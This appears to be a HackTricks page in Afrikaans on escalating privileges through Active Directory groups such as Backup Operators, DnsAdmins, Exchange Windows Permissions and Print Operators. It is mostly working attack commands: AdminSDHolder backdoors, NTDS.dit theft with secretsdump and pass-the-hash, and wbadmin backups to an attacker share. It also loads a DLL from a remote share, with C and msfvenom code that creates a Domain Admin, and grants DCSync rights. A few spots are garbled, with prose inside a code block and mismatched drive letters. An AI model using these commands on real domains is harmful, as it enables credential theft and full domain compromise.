# Bevoorregte Groepe

{{#include ../../banners/hacktricks-training.md}}

## Bekende groepe met administrasievoorregte

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Hierdie groep is gemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Daarbenewens maak dit plaaslike aanmelding by die Domain Controller (DC) moontlik.

Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Die byvoeging van nuwe gebruikers word toegelaat, asook plaaslike aanmelding by die DC.<sup>[[1]](#references)</sup>

## AdminSDHolder-groep

Die **AdminSDHolder**-groep se Access Control List (ACL) is krities, aangesien dit permissions vir alle “protected groups” binne Active Directory instel, insluitend groepe met hoë privileges. Hierdie meganisme verseker die sekuriteit van hierdie groepe deur ongemagtigde wysigings te voorkom.

'n Aanvaller kan dit uitbuit deur die **AdminSDHolder**-groep se ACL te wysig en volledige permissions aan 'n standaardgebruiker toe te ken. Dit sal daardie gebruiker effektief volledige beheer oor alle protected groups gee. Indien hierdie gebruiker se permissions gewysig of verwyder word, sal dit binne 'n uur outomaties herstel word weens die stelsel se ontwerp.<sup>[[14]](#references)</sup>

Onlangse Windows Server-dokumentasie behandel steeds verskeie ingeboude operator-groepe as **protected**-objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, ens.). Die **SDProp**-proses loop by verstek elke 60 minute op die **PDC Emulator**, stel `adminCount=1`, en deaktiveer inheritance op protected-objekte. Dit is nuttig vir sowel persistence as die opsporing van verouderde bevoorregte gebruikers wat uit 'n protected-groep verwyder is, maar steeds die non-inheriting ACL behou.<sup>[[12]](#references)</sup>

Commands om die lede te hersien en permissions te wysig, sluit in:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
'n Skrip is beskikbaar om die herstelproses te bespoedig: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Lidmaatskap van hierdie groep laat die lees van geskrapte Active Directory-objekte toe, wat sensitiewe inligting kan openbaar:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Dit is nuttig om **vorige voorregpaaie te herstel**. Geskrapte objekte kan steeds `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, ou SPN's, of die DN van 'n geskrapte bevoorregte groep blootlê wat later deur 'n ander operateur herstel kan word.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Toegang tot Domain Controller

Toegang tot lêers op die DC is beperk tensy die gebruiker deel van die `Server Operators`-groep is, wat die vlak van toegang verander.

### Privilege Escalation

Deur `PsService` of `sc` van Sysinternals te gebruik, kan ’n mens dienstoestemmings inspekteer en wysig. Die `Server Operators`-groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van arbitrêre opdragte en privilege escalation moontlik maak:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Hierdie opdrag onthul dat `Server Operators` volle toegang het, wat die manipulering van dienste vir verhoogde voorregte moontlik maak.

## Backup Operators

Lidmaatskap van die `Backup Operators`-groep bied toegang tot die `DC01`-lêerstelsel weens die `SeBackup`- en `SeRestore`-voorregte. Hierdie voorregte maak dit moontlik om deur vouers te navigeer, vouers te lys en lêers te kopieer, selfs sonder eksplisiete toestemmings, deur die `FILE_FLAG_BACKUP_SEMANTICS`-vlag te gebruik. Die gebruik van spesifieke scripts is vir hierdie proses nodig.<sup>[[1]](#references)</sup>

Om groep lede te lys, voer uit:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Plaaslike Aanval

Om hierdie privileges plaaslik te benut, word die volgende stappe gevolg:

1. Importeer die nodige libraries:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Aktiveer en verifieer `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kry toegang tot en kopieer lêers uit beperkte gidse, byvoorbeeld:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD-aanval

Direkte toegang tot die Domain Controller se lêerstelsel maak die diefstal van die `NTDS.dit`-databasis moontlik, wat alle NTLM-hashes vir domeingebruikers en rekenaars bevat.

#### Gebruik diskshadow.exe

1. Skep ’n shadow copy van die `C`-skyf:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopieer `NTDS.dit` vanaf die shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatiewelik, gebruik `robocopy` om lêers te kopieer:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Onttrek `SYSTEM` en `SAM` vir hash-herwinning:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Haal alle hashes uit `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Na-ekstraksie: Pass-the-Hash na DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Gebruik van wbadmin.exe

1. Stel die NTFS-lêerstelsel vir die SMB server op die aanvaller se masjien op en kas SMB-geloofsbriewe op die teikenmasjien.
2. Gebruik `wbadmin.exe` vir stelselrugsteun en `NTDS.dit`-ekstraksie:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Vir ’n praktiese demonstrasie, sien [DEMO-VIDEO MET IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Lede van die **DnsAdmins**-groep kan hul voorregte uitbuit om ’n arbitrêre DLL met SYSTEM-voorregte op ’n DNS-server te laai, wat dikwels op Domain Controllers gehuisves word. Hierdie vermoë bied aansienlike uitbuitingspotensiaal.

Om lede van die DnsAdmins-groep te lys, gebruik:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Voer arbitrêre DLL uit (CVE‑2021‑40469)

> [!NOTE]
> Hierdie kwesbaarheid laat die uitvoering van arbitrêre kode met SYSTEM-voorregte in die DNS-diens toe (gewoonlik binne die DCs). Hierdie probleem is in 2021 reggestel.

Lede kan die DNS-bediener ’n arbitrêre DLL laat laai (plaaslik of vanaf ’n afgeleë share) deur opdragte soos die volgende te gebruik:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Die herbegin van die DNS-diens (wat moontlik bykomende toestemmings vereis) is nodig sodat die DLL gelaai kan word:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Vir meer besonderhede oor hierdie aanvalvektor, verwys na ired.team.

#### Mimilib.dll

Dit is ook moontlik om mimilib.dll vir command execution te gebruik deur dit te wysig om spesifieke commands of reverse shells uit te voer. [Kyk na hierdie plasing](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins kan DNS-records manipuleer om Man-in-the-Middle (MitM)-aanvalle uit te voer deur ’n WPAD-record te skep nadat die global query block list gedeaktiveer is. Tools soos Responder of Inveigh kan vir spoofing en die vaslegging van netwerkverkeer gebruik word.

### Event Log Readers
Lede kan toegang tot event logs verkry en moontlik sensitiewe inligting vind, soos plaintext-wagwoorde of besonderhede oor command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Hierdie groep kan DACLs op die domeinobjek wysig, wat moontlik DCSync-voorregte kan toestaan. Tegnieke vir privilege escalation wat hierdie groep uitbuit, word in die Exchange-AD-Privesc GitHub repo uiteengesit.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
As jy as ’n lid van hierdie groep kan optree, is die klassieke misbruik om aan ’n aanvaller-beheerde principal die replikasieregte toe te ken wat vir [DCSync](dcsync.md) benodig word:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Histories het **PrivExchange** mailbox-toegang, gedwonge Exchange-authentication en LDAP relay gekombineer om op hierdie selfde primitief uit te kom. Selfs waar daardie relay-pad versag is, bly direkte lidmaatskap van `Exchange Windows Permissions` of beheer oor ’n Exchange-bediener ’n waardevolle roete na domeinreplikasieregte.

## Hyper-V Administrators

Hyper-V Administrators het volle toegang tot Hyper-V, wat uitgebuit kan word om beheer oor gevirtualiseerde Domain Controllers te verkry. Dit sluit in die kloning van lewendige DCs en die onttrekking van NTLM-hashes uit die NTDS.dit-lêer.

### Uitbuitingsvoorbeeld

Die praktiese misbruik is gewoonlik **vanlyn toegang tot DC-skywe/checkpoints** eerder as ou host-level LPE-truuks. Met toegang tot die Hyper-V-host kan ’n operateur ’n gevirtualiseerde Domain Controller se checkpoint skep of dit uitvoer, die VHDX mount, en `NTDS.dit`, `SYSTEM` en ander secrets onttrek sonder om aan LSASS binne die guest te raak:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Van daar af, hergebruik die `Backup Operators`-werkvloei om `Windows\NTDS\ntds.dit` en die register-hives vanlyn te kopieer.

## Group Policy Creators Owners

Hierdie groep laat lede toe om Group Policies in die domein te skep. Die lede daarvan kan egter nie group policies op gebruikers of groepe toepas of bestaande GPOs wysig nie.

Die belangrike nuanse is dat die **skepper die eienaar van die nuwe GPO word** en gewoonlik genoeg regte kry om dit daarna te wysig. Dit beteken hierdie groep is interessant wanneer jy een van die volgende kan doen:

- ’n malicious GPO skep en ’n admin oortuig om dit aan ’n teiken-OU/domein te koppel
- ’n GPO wysig wat jy geskep het en wat reeds êrens nuttig gekoppel is
- ’n ander gedelegeerde reg misbruik wat jou toelaat om GPOs te koppel, terwyl hierdie groep jou die wysigingskant gee

Praktiese misbruik beteken gewoonlik dat jy ’n **Immediate Task**, **startup script**, **local admin membership**, of **user rights assignment**-verandering deur SYSVOL-gesteunde beleidslêers toevoeg.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Indien die GPO handmatig deur `SYSVOL` gewysig word, onthou dat die verandering nie op sy eie voldoende is nie: `versionNumber`, `GPT.ini` en soms `gPCMachineExtensionNames` moet ook opgedateer word, anders sal kliënte die beleidsverversing ignoreer.<sup>[[9]](#references)</sup>

## Organization Management

In omgewings waar **Microsoft Exchange** ontplooi is, beskik ’n spesiale groep bekend as **Organization Management** oor beduidende vermoëns. Hierdie groep het bevoorregte **toegang tot die posbusse van alle domeingebruikers** en behou **volle beheer oor die 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`**-groep in, wat vir privilege escalation uitgebuit kan word.

### Privilege Exploitation and Commands

#### Print Operators

Lede van die **Print Operators**-groep beskik oor verskeie privileges, insluitend **`SeLoadDriverPrivilege`**, wat hulle toelaat om **plaaslik by ’n Domain Controller aan te meld**, dit af te skakel en drukkers te bestuur. Om hierdie privileges uit te buit, veral indien **`SeLoadDriverPrivilege`** nie binne ’n unelevated context sigbaar is nie, is dit nodig om User Account Control (UAC) te omseil.<sup>[[1]](#references)</sup>

Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Op Domain Controllers is hierdie groep gevaarlik omdat die verstek Domain Controller Policy **`SeLoadDriverPrivilege`** aan `Print Operators` toeken. As jy ’n verhoogde token vir ’n lid van hierdie groep verkry, kan jy die privilege aktiveer en ’n ondertekende maar kwesbare driver laai om na kernel/SYSTEM oor te skakel.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Vir besonderhede oor token-hantering, kyk na [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Lede van hierdie groep kry toegang tot rekenaars via Remote Desktop Protocol (RDP). Om hierdie lede te enumerate, is PowerShell-opdragte beskikbaar:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Verdere insigte in die uitbuiting van RDP kan in toegewyde pentesting-hulpbronne gevind word.

#### Remote Management Users

Lede kan toegang tot rekenaars verkry via **Windows Remote Management (WinRM)**. Enumerasie van hierdie lede word bereik deur:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Vir exploitation-tegnieke wat met **WinRM** verband hou, moet spesifieke dokumentasie geraadpleeg word.

#### Server Operators

Hierdie groep het toestemmings om verskeie konfigurasies op Domain Controllers uit te voer, insluitend rugsteun- en herstelvoorregte, die verandering van die stelseltyd en die afskakeling van die stelsel.<sup>[[1]](#references)</sup> Om die lede te enumerate, is die volgende opdrag beskikbaar:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Op Domain Controllers erf `Server Operators` gewoonlik genoeg regte om **dienste te herkonfigureer of te begin/stop**, en ontvang hulle ook `SeBackupPrivilege`/`SeRestorePrivilege` deur die verstek-DC-beleid. In die praktyk maak dit hulle ’n brug tussen **service-control abuse** en **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
As ’n service ACL hierdie groep change/start-regte gee, wys die service na ’n arbitrêre command, start dit as `LocalSystem`, en herstel dan die oorspronklike `binPath`. As diensbeheer beperk is, gebruik die `Backup Operators`-tegnieke hier bo as terugval om `NTDS.dit` te kopieer.

## Verwysings

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
